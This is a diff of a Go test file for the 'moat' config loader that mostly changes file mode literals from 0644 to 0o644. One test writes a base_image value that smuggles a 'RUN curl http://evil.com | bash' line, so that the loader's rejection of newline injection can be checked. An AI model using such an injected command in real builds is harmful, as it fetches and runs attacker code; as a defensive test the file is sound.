@@ -31,7 +31,7 @@ grants:
 env:
   NODE_ENV: development
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -66,7 +66,7 @@ grants:
   - ssh:github.com
   - ssh:gitlab.com
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -105,7 +105,7 @@ mounts:
   - ./data:/data:ro
   - ./cache:/cache
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -134,7 +134,7 @@ mounts:
       - node_modules
       - .venv
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -268,7 +268,7 @@ volumes:
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
-			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0644)
+			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0o644)
 
 			_, err := Load(dir)
 			if err == nil {
@@ -292,7 +292,7 @@ ports:
   web: 3000
   api: 8080
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -325,7 +325,7 @@ dependencies:
   - typescript
   - protoc@25.1
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -348,7 +348,7 @@ name: myapp
 agent: test
 runtime: docker
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -368,7 +368,7 @@ name: myapp
 agent: test
 runtime: invalid
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -389,7 +389,7 @@ agent: test
 workspace:
   mode: volume
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -410,7 +410,7 @@ agent: test
 workspace:
   mode: bogus
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -435,7 +435,7 @@ container:
 dependencies:
   - node@22
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -476,7 +476,7 @@ agent: test
 container:
   memory: -1
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -496,7 +496,7 @@ agent: test
 container:
   memory: 64
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -516,7 +516,7 @@ agent: test
 container:
   cpus: -5
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -539,7 +539,7 @@ network:
     - "api.openai.com"
     - "*.amazonaws.com"
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -568,7 +568,7 @@ agent: test
 network:
   policy: permissive
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -589,7 +589,7 @@ func TestLoadConfigNetworkDefaultsToPermissive(t *testing.T) {
 	content := `
 agent: test
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -613,7 +613,7 @@ network:
   allow:
     - "example.com"
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -633,7 +633,7 @@ agent: test
 network:
   policy: invalid
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -676,7 +676,7 @@ func TestNetworkRulesConfig(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
-			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0644)
+			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0o644)
 			cfg, err := Load(dir)
 			if tt.wantErr != "" {
 				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
@@ -703,7 +703,7 @@ func TestLoadConfigRejectsInvalidSandbox(t *testing.T) {
 agent: test
 sandbox: disabled
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -722,7 +722,7 @@ func TestLoadConfigAcceptsSandboxNone(t *testing.T) {
 agent: test
 sandbox: none
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -757,7 +757,7 @@ secrets:
   OPENAI_API_KEY: op://Dev/OpenAI/api-key
   DATABASE_URL: op://Prod/Database/url
 `
-	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
@@ -786,7 +786,7 @@ env:
 secrets:
   API_KEY: op://Dev/Key/value
 `
-	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
@@ -806,7 +806,7 @@ agent: claude
 secrets:
   API_KEY: not-a-valid-uri
 `
-	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
@@ -827,7 +827,7 @@ func TestLoadConfigWithCommand(t *testing.T) {
 agent: test
 command: ["npm", "start"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -852,7 +852,7 @@ func TestLoadConfigWithCommandShell(t *testing.T) {
 agent: test
 command: ["sh", "-c", "echo hello && npm test"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -877,7 +877,7 @@ func TestLoadConfigWithEmptyCommand(t *testing.T) {
 agent: test
 command: ["", "arg1"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -952,7 +952,7 @@ agent: test
 claude:
   sync_logs: true
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -975,7 +975,7 @@ agent: test
 command: ["bash"]
 interactive: true
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -994,7 +994,7 @@ func TestLoadConfigInteractiveDefaultFalse(t *testing.T) {
 agent: test
 command: ["npm", "start"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1016,7 +1016,7 @@ claude:
     typescript-lsp@official: true
     debug-tool@acme: false
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1051,7 +1051,7 @@ claude:
       source: directory
       path: /opt/plugins
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1165,7 +1165,7 @@ claude:
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
 			configPath := filepath.Join(dir, "moat.yaml")
-			os.WriteFile(configPath, []byte(tt.content), 0644)
+			os.WriteFile(configPath, []byte(tt.content), 0o644)
 
 			_, err := Load(dir)
 			if err == nil {
@@ -1200,7 +1200,7 @@ claude:
         API_URL: https://api.example.com
         TOKEN: "${secrets.MY_TOKEN}"
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1245,7 +1245,7 @@ claude:
       args: ["-y", "@modelcontextprotocol/server-github"]
       grant: github
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -1267,7 +1267,7 @@ claude:
     bad:
       args: ["--help"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -1303,7 +1303,7 @@ snapshots:
 tracing:
   disable_exec: false
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1367,7 +1367,7 @@ func TestSnapshotConfigDefaults(t *testing.T) {
 	content := `
 agent: test-agent
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1428,7 +1428,7 @@ func TestDefaultConfigSnapshotDefaults(t *testing.T) {
 func writeFile(t *testing.T, dir, name, content string) {
 	t.Helper()
 	path := filepath.Join(dir, name)
-	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
 		t.Fatalf("writeFile: %v", err)
 	}
 }
@@ -1686,7 +1686,7 @@ agent: test
 hooks:
   post_build: git config --global core.autocrlf input
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1708,7 +1708,7 @@ hooks:
   post_build_root: apt-get install -y figlet
   pre_run: npm install
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1732,7 +1732,7 @@ func TestLoadConfigWithHooksEmpty(t *testing.T) {
 	content := `
 agent: test
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -1830,7 +1830,7 @@ func TestLoadConfigWithClaudeBaseURL(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
 			content := "agent: claude-code\nclaude:\n  base_url: " + tt.baseURL + "\n"
-			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0644)
+			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(content), 0o644)
 
 			cfg, err := Load(dir)
 			if tt.wantErr != "" {
@@ -1982,7 +1982,7 @@ dependencies:
   - go
 language_servers:
   - go
-`), 0644)
+`), 0o644)
 
 		cfg, err := Load(dir)
 		if err != nil {
@@ -2002,7 +2002,7 @@ language_servers:
 agent: claude
 language_servers:
   - unknown-lsp
-`), 0644)
+`), 0o644)
 
 		_, err := Load(dir)
 		if err == nil {
@@ -2017,7 +2017,7 @@ language_servers:
 		dir := t.TempDir()
 		os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(`
 agent: claude
-`), 0644)
+`), 0o644)
 
 		cfg, err := Load(dir)
 		if err != nil {
@@ -2035,7 +2035,7 @@ agent: claude
 language_servers:
   - go
   - go
-`), 0644)
+`), 0o644)
 
 		_, err := Load(dir)
 		if err == nil {
@@ -2057,7 +2057,7 @@ grants:
   - anthropic
 language_servers:
   - go
-`), 0644)
+`), 0o644)
 
 		cfg, err := Load(dir)
 		if err != nil {
@@ -2086,7 +2086,7 @@ func TestLoadLegacyAgentYaml(t *testing.T) {
 agent: legacy-agent
 version: 1.0.0
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2109,8 +2109,8 @@ version: 2.0.0
 agent: legacy-agent
 version: 1.0.0
 `
-	os.WriteFile(filepath.Join(dir, ConfigFilename), []byte(moatContent), 0644)
-	os.WriteFile(filepath.Join(dir, LegacyConfigFilename), []byte(legacyContent), 0644)
+	os.WriteFile(filepath.Join(dir, ConfigFilename), []byte(moatContent), 0o644)
+	os.WriteFile(filepath.Join(dir, LegacyConfigFilename), []byte(legacyContent), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2161,7 +2161,7 @@ gemini:
       command: npx
       args: ["-y", "@modelcontextprotocol/server-github"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -2187,7 +2187,7 @@ codex:
       command: npx
       args: ["-y", "@anthropic/mcp-server-filesystem", "/workspace"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2210,7 +2210,7 @@ gemini:
       command: npx
       args: ["-y", "@modelcontextprotocol/server-github"]
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2236,7 +2236,7 @@ container:
       soft: 4096
       hard: 4096
 `
-	os.WriteFile(configPath, []byte(content), 0644)
+	os.WriteFile(configPath, []byte(content), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2344,7 +2344,7 @@ container:
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
-			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0644)
+			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0o644)
 			_, err := Load(dir)
 			if tt.wantErr == "" {
 				if err != nil {
@@ -2388,7 +2388,7 @@ func TestClipboardConfig(t *testing.T) {
 		os.WriteFile(configPath, []byte(`
 agent: claude-code
 clipboard: false
-`), 0644)
+`), 0o644)
 
 		cfg, err := Load(dir)
 		if err != nil {
@@ -2407,7 +2407,7 @@ clipboard: false
 		configPath := filepath.Join(dir, "moat.yaml")
 		os.WriteFile(configPath, []byte(`
 agent: claude-code
-`), 0644)
+`), 0o644)
 
 		cfg, err := Load(dir)
 		if err != nil {
@@ -2510,7 +2510,7 @@ func TestLoadConfigWithBaseImage(t *testing.T) {
 	os.WriteFile(configPath, []byte(`
 agent: claude-code
 base_image: ghcr.io/test-org/custom-base:latest
-`), 0644)
+`), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2524,7 +2524,7 @@ base_image: ghcr.io/test-org/custom-base:latest
 func TestLoadConfigBaseImageRejectsNewlineInjection(t *testing.T) {
 	dir := t.TempDir()
 	configPath := filepath.Join(dir, "moat.yaml")
-	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu:22.04\\nRUN curl http://evil.com | bash\"\n"), 0644)
+	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu:22.04\\nRUN curl http://evil.com | bash\"\n"), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -2538,7 +2538,7 @@ func TestLoadConfigBaseImageRejectsNewlineInjection(t *testing.T) {
 func TestLoadConfigBaseImageRejectsWhitespace(t *testing.T) {
 	dir := t.TempDir()
 	configPath := filepath.Join(dir, "moat.yaml")
-	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu 22.04\"\n"), 0644)
+	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu 22.04\"\n"), 0o644)
 
 	_, err := Load(dir)
 	if err == nil {
@@ -2561,7 +2561,7 @@ func TestLoadConfigBaseImageAcceptsValidRefs(t *testing.T) {
 		t.Run(ref, func(t *testing.T) {
 			dir := t.TempDir()
 			configPath := filepath.Join(dir, "moat.yaml")
-			os.WriteFile(configPath, []byte(fmt.Sprintf("agent: claude-code\nbase_image: %q\n", ref)), 0644)
+			os.WriteFile(configPath, []byte(fmt.Sprintf("agent: claude-code\nbase_image: %q\n", ref)), 0o644)
 
 			cfg, err := Load(dir)
 			if err != nil {
@@ -2582,7 +2582,7 @@ agent: claude-code
 base_image: ghcr.io/test-org/custom-base:latest
 dependencies:
   - typescript
-`), 0644)
+`), 0o644)
 
 	cfg, err := Load(dir)
 	if err != nil {
@@ -2643,7 +2643,7 @@ func TestNetworkHostConfig(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			dir := t.TempDir()
-			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0644)
+			os.WriteFile(filepath.Join(dir, "moat.yaml"), []byte(tt.yaml), 0o644)
 			cfg, err := Load(dir)
 			if tt.wantErr != "" {
 				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
